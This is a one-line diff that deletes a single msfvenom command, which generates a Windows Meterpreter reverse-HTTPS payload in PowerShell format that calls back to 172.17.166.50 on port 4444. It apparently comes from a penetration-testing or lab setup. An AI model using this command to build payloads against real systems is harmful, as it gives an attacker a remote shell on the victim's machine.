@@ -1,1 +1,0 @@
-msfvenom -p windows/x64/meterpreter/reverse_https LHOST=172.17.166.50 LPORT=4444 -f powershell > /root/Desktop/wind1881.txt
